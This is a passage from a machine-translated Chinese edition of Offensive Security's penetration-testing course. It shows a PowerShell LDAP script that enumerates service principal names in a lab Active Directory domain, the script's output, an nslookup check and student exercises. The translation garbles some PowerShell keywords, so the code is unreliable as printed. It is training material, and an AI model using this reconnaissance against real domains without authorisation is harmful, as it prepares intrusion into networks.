<div style="position:absolute;top:24887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">632 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/ms684272 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:24907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">633 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2017 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/ms677949 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:24927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">634 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2009 年），https://blogs.technet.microsoft.com/askds/2009/09/10/managed-service-accounts-understanding-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:24942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实施最佳实践和故障排除/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:24961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">635 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2018 年），https://en.wikipedia.org/wiki/Microsoft_Exchange_Server</font></font></font></nobr></div>
<div style="position:absolute;top:24981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2012 年），https://blogs.technet.microsoft.com/askpfeplat/2012/12/16/windows-server-2012-group-managed-service-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:24996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户/ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:25123;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="22"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 22 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:25156;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:26233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:26233;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:26233;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">639</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:25246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.5.1.1</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:25296;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Microsoft 没有记录可搜索 SPN 的列表，但有</font></font></i></nobr></div>
<div style="position:absolute;top:25316;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在线提供广泛的列表。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">637</font></font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，让我们更新 PowerShell 枚举脚本以过滤</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">serviceprincipalname</font></font></i></nobr></div>
<div style="position:absolute;top:25397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*http* 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性</font><font style="vertical-align: inherit;">，表明存在已注册的 Web 服务器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:25466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:25500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:25516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:25550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:25585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:25618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></nobr></div>
<div style="position:absolute;top:25652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></nobr></div>
<div style="position:absolute;top:25686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
<div style="position:absolute;top:25720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter= </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"serviceprincipalname=*http*"</font></font></font></b></nobr></div>
<div style="position:absolute;top:25754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Result = $Searcher.FindAll()</font></font></nobr></div>
<div style="position:absolute;top:25788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($结果中的$obj)</font></font></nobr></div>
<div style="position:absolute;top:25805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:25822;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($obj.Properties 中的 $prop)</font></font></nobr></div>
<div style="position:absolute;top:25839;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:25856;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$prop</font></font></nobr></div>
<div style="position:absolute;top:25873;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:25890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:25909;left:245"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 686 - 用于检测注册服务主体名称的 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:25938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此搜索返回许多结果，尽管可以进一步过滤它们，但我们可以轻松地</font></font></nobr></div>
<div style="position:absolute;top:25958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现货相关资料：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:25993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:25993;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">价值    </font></font></nobr></div>
<div style="position:absolute;top:26010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:26010;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----    </font></font></nobr></div>
<div style="position:absolute;top:26027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给定的名称    </font></font></nobr></div>
<div style="position:absolute;top:26027;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{iis_service}    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:26044;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同名    </font></font></b></nobr></div>
<div style="position:absolute;top:26044;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{iis_service}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cn    </font></font></nobr></div>
<div style="position:absolute;top:26061;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{iis_service}    </font></font></nobr></div>
<div style="position:absolute;top:26078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码组    </font></font></nobr></div>
<div style="position:absolute;top:26078;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{131623309820953450}  </font></font></nobr></div>
<div style="position:absolute;top:26095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建时    </font></font></nobr></div>
<div style="position:absolute;top:26095;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{05/02/2018 19.03.02} </font></font></nobr></div>
<div style="position:absolute;top:26112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">badpwdcount    </font></font></nobr></div>
<div style="position:absolute;top:26112;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}  </font></font></nobr></div>
<div style="position:absolute;top:26128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称    </font></font></nobr></div>
<div style="position:absolute;top:26128;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{iis_service}  </font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:26183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">637 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（肖恩·梅特卡夫，2017 年），http://adsecurity.org/?page_id=183</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:26311;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="23"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 23 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:26344;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:27421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:27421;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:27421;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">640</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后登录    </font></font></nobr></div>
<div style="position:absolute;top:26440;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{131624786130434963}   </font></font></nobr></div>
<div style="position:absolute;top:26456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相同帐户类型    </font></font></nobr></div>
<div style="position:absolute;top:26456;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{805306368}   </font></font></nobr></div>
<div style="position:absolute;top:26473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家代码    </font></font></nobr></div>
<div style="position:absolute;top:26473;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0} </font></font></nobr></div>
<div style="position:absolute;top:26490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象引导    </font></font></nobr></div>
<div style="position:absolute;top:26490;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{201 74 156 103 125 89 254 67 146 40 244 7 212 176 32 11}  </font></font></nobr></div>
<div style="position:absolute;top:26508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改变了    </font></font></nobr></div>
<div style="position:absolute;top:26508;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{28741}  </font></font></nobr></div>
<div style="position:absolute;top:26524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">何时改变    </font></font></nobr></div>
<div style="position:absolute;top:26524;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{07/02/2018 12.08.56}   </font></font></nobr></div>
<div style="position:absolute;top:26541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:26541;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{iis_service}   </font></font></nobr></div>
<div style="position:absolute;top:26558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象标识    </font></font></nobr></div>
<div style="position:absolute;top:26558;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{1 5 0 0 0 0 0 5 21 0 0 0 202 203 185 181 144 182 205 192 58 2</font></font></nobr></div>
<div style="position:absolute;top:26575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录次数    </font></font></nobr></div>
<div style="position:absolute;top:26575;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{3}  </font></font></nobr></div>
<div style="position:absolute;top:26592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码错误时间    </font></font></nobr></div>
<div style="position:absolute;top:26592;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}  </font></font></nobr></div>
<div style="position:absolute;top:26609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户到期    </font></font></nobr></div>
<div style="position:absolute;top:26609;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{9223372036854775807}   </font></font></nobr></div>
<div style="position:absolute;top:26626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主组ID    </font></font></nobr></div>
<div style="position:absolute;top:26626;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{513}   </font></font></nobr></div>
<div style="position:absolute;top:26643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类别    </font></font></nobr></div>
<div style="position:absolute;top:26643;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}  </font></font></nobr></div>
<div style="position:absolute;top:26660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户主体名称 {iis_service@corp.com} </font></font></nobr></div>
<div style="position:absolute;top:26677;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户控制{590336}   </font></font></nobr></div>
<div style="position:absolute;top:26694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dscorepropagationdata {01/01/1601 00.00.00} </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:26711;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">serviceprincipalname {HTTP/CorpWebServer.corp.com}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专有名称 {CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:26745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类    </font></font></nobr></div>
<div style="position:absolute;top:26745;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{顶部，人，组织人，用户} </font></font></nobr></div>
<div style="position:absolute;top:26762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们创造的    </font></font></nobr></div>
<div style="position:absolute;top:26762;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{12919}    </font></font></nobr></div>
<div style="position:absolute;top:26779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后登录时间戳{131624773644330799}    </font></font></nobr></div>
<div style="position:absolute;top:26796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广告路径    </font></font></nobr></div>
<div style="position:absolute;top:26796;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{LDAP://CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp</font></font></nobr></div>
<div style="position:absolute;top:26813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,DC=com}    </font></font></nobr></div>
<div style="position:absolute;top:26830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...    </font></font></nobr></div>
<div style="position:absolute;top:26849;left:308"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 687 - 服务主体名称搜索的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:26879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据输出，一个属性名称</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">samaccountname</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iis_service</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，表示</font></font></nobr></div>
<div style="position:absolute;top:26898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 服务器和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">serviceprincipalname 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/CorpWebServer.corp.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:26917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有似乎都表明存在网络服务器。</font></font></nobr></div>
<div style="position:absolute;top:26950;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析“CorpWebServer.corp.com” </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:26985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec.CORP&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup CorpWebServer.corp.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:27002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：未知</font></font></nobr></div>
<div style="position:absolute;top:27019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:27053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：corpwebserver.corp.com</font></font></nobr></div>
<div style="position:absolute;top:27070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：192.168.1.110</font></font></nobr></div>
<div style="position:absolute;top:27089;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 688 - serviceprincipalname 条目的 Nslookup</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:27118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从结果来看，很明显主机名解析为内部 IP 地址，即 IP</font></font></nobr></div>
<div style="position:absolute;top:27138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器的地址。</font></font></nobr></div>
<div style="position:absolute;top:27171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们浏览这个 IP，我们会找到一个默认的 IIS Web 服务器，如图 308 所示。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:27499;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="24"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 24 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:27532;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:28609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:28609;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:28609;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">641</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:28107;left:302"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 308：CorpWebServer.corp.com 上的 IIS Web 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管域控制器通常不会托管 Web 服务器，但学生实验室充满了</font></font></nobr></div>
<div style="position:absolute;top:28158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">惊喜。</font></font></nobr></div>
<div style="position:absolute;top:28191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然服务主体名称的枚举不会产生 Web 服务器软件或</font></font></nobr></div>
<div style="position:absolute;top:28210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本，它将缩小搜索范围并允许手动检测或严格范围的端口</font></font></nobr></div>
<div style="position:absolute;top:28229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28264;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.5.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 重复本节中的步骤以发现 IIS 服务器的服务主体名称。</font></font></nobr></div>
<div style="position:absolute;top:28322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 发现域中任何其他注册的服务主体名称。</font></font></nobr></div>
<div style="position:absolute;top:28350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 更新脚本，使结果包括服务所在的任何服务器的 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:28370;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主体名称已注册。</font></font></nobr></div>
<div style="position:absolute;top:28398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用 Get-SPN 脚本</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">638</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并重新发现相同的服务主体名称。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:28545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">638 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（斯科特·萨瑟兰，2013），</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Get-SPN.ps1 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:28687;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="25"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 25 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:28720;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:29797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:29797;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:29797;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">642</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:28816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.3 活动目录认证</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:28857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经枚举了用户帐户、组成员身份和注册的 SPN，让我们</font></font></nobr></div>
<div style="position:absolute;top:28877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用此信息来破坏 Active Directory。</font></font></nobr></div>
<div style="position:absolute;top:28910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们必须首先讨论 Active Directory 身份验证的详细信息。</font></font></nobr></div>
<div style="position:absolute;top:28943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 支持多种身份验证协议和技术并实现</font></font></nobr></div>
<div style="position:absolute;top:28962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对 Windows 计算机以及运行 Linux 和 macOS 的计算机进行身份验证。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:29024;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Active Directory 支持多种较旧的协议，包括 WDigest。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">639</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然</font></font></i></nobr></div>
<div style="position:absolute;top:29043;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些可能对 Windows 7 或 Windows 等较旧的操作系统有用</font></font></i></nobr></div>
<div style="position:absolute;top:29062;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Server 2008 R2，我们将只关注更现代的身份验证协议</font></font></i></nobr></div>
